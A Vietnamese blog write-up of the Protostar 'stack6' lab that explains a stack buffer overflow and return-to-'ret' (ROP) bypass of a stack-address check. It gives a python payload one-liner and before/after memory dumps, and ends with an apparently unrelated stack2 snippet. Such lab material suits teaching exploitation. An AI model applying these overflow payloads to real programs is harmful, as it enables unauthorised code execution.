---
layout: post
title: stack6
---
Trong bài trước, chúng ta đã học cách inject code và điều hướng chương trình để đoạn code này được thực thi.
Bài này sẽ nâng độ khó lên một chút bằng cách giới hạn giá trị `eip` của caller.
Hãy cùng xem source code và asm code của chương trình như sau:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
```asm
0x08048484 <getpath+0>: push   ebp
0x08048485 <getpath+1>: mov    ebp,esp
0x08048487 <getpath+3>: sub    esp,0x68
0x0804848a <getpath+6>: mov    eax,0x80485d0
0x0804848f <getpath+11>:        mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:        call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:        mov    eax,ds:0x8049720
0x0804849c <getpath+24>:        mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:        call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
0x080484af <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:        and    eax,0xbf000000
0x080484bd <getpath+57>:        cmp    eax,0xbf000000
0x080484c2 <getpath+62>:        jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:        mov    eax,0x80485e4
0x080484c9 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:        mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:        call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:        call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:        mov    eax,0x80485f0
0x080484e9 <getpath+101>:       lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:       mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:       call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:       leave
0x080484f9 <getpath+117>:       ret
0x080484fa <main+0>:    push   ebp
0x080484fb <main+1>:    mov    ebp,esp
0x080484fd <main+3>:    and    esp,0xfffffff0
0x08048500 <main+6>:    call   0x8048484 <getpath>
0x08048505 <main+11>:   mov    esp,ebp
0x08048507 <main+13>:   pop    ebp
0x08048508 <main+14>:   ret

```
Hàm `getpath` không cho phép `eip` của caller có dạng `0xbfxxxxxx`, tương đương với địa chỉ của bộ nhớ stack.
Do vậy, kỹ thuật của bài trước sẽ cần phải thay đổi.

Về cơ bản, đoạn code inject vào chương trình được lưu trong stack.
Do vậy, chúng ta vẫn sẽ cần điều hướng chương trình đến bộ nhớ này.
Để làm được điều này, ta sẽ dùng một kỹ thuật có tên "Return-Oriented Programming" (ROP).
Mục tiêu của kỹ thuật này là điều hướng chương trình đến nhưng đoạn code có sẵn nằm trong vùng cho phép thực thi (ví dụ trong vùng .text của asm, và không phải trên stack).
Việc điều hướng có thể được thực hiện nhiều lần có tính toán, khiến chương trình thực thi một chuỗi lệnh.

Sau đây là một ví dụ của ROP.
Chúng ta sẽ thực hiện overflow cho `buffer` như bài trước để inject code và ghi đè `eip` của caller.
Lần này chúng ta sẽ điều hướng `eip` đến một lệnh `ret` bất kỳ có sẵn trong chương trình chính.
Khi lệnh `ret` này được thực thi, giá trị tại `esp` sẽ được `pop` sang `eip`.
Dựa vào dự đoán này, ta sẽ ghi đè thêm 4 byte ngay sau `eip` mới.
4 byte này chính là địa chỉ của đoạn code đã được inject.
Nó có thể nằm trên stack.
```bash
python -c "print '\xcc' * 64 + '\xcc' * 4 + '\xcc' * 8 + '\xcc' * 4 + '\xf9\x84\x04\x08' + '\x6c\xf7\xff\xbf'" > input.txt
```
Đoạn script trên ghi đè lên 64 byte giá trị `buffer`, 4 byte giá trị biến `ret`, 8 byte padding, 4 byte `eip` mới của caller, và 4 byte địa chỉ injected code.
Sau đây là bộ nhớ trước và sau `gets`.
Phân biệt <span style="color:aqua">buffer</span>, <span style="color:red">eip mới của caller</span>, và <span style="color:springgreen">địa chỉ điều hướng về injected code</span>.
<pre class="memory">
0xbffff730:     0xbffff74c      0x00000000      0xb7fe1b28      0x00000001
0xbffff740:     0x00000000      0x00000001      0xb7fff8f8      <span style="color:aqua">0xb7f0186e</span>
0xbffff750:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0xb7ec6165</span>      <span style="color:aqua">0xbffff768</span>      <span style="color:aqua">0xb7eada75</span>
0xbffff760:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x080496ec</span>      <span style="color:aqua">0xbffff778</span>      <span style="color:aqua">0x0804835c</span>
0xbffff770:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x080496ec</span>      <span style="color:aqua">0xbffff7a8</span>      <span style="color:aqua">0x08048539</span>
0xbffff780:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08048520</span>      0xbffff7a8
0xbffff790:     0xb7ec6365      0xb7ff1040      0xbffff7a8      <span style="color:orangered">0x08048505</span>
0xbffff7a0:     0x08048520      0x00000000      0xbffff828      0xb7eadc76
</pre>
<pre class="memory">
0xbffff730:     0xbffff74c      0x00000000      0xb7fe1b28      0x00000001
0xbffff740:     0x00000000      0x00000001      0xb7fff8f8      <span style="color:aqua">0xcccccccc</span>
0xbffff750:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff760:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff770:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff780:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      0xcccccccc</span>
0xbffff790:     0xcccccccc      0xcccccccc      0xcccccccc      <span style="color:orangered">0x080484f9</span>
0xbffff7a0:     <span style="color:springgreen">0xbffff76c</span>      0x00000000      0xbffff828      0xb7eadc76
</pre>
## Ref
```bash
user@protostar:~$ export GREENIE=$'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888\x0a\x0d\x0a\x0d'
user@protostar:~$ stack2
you have correctly modified the variable
```
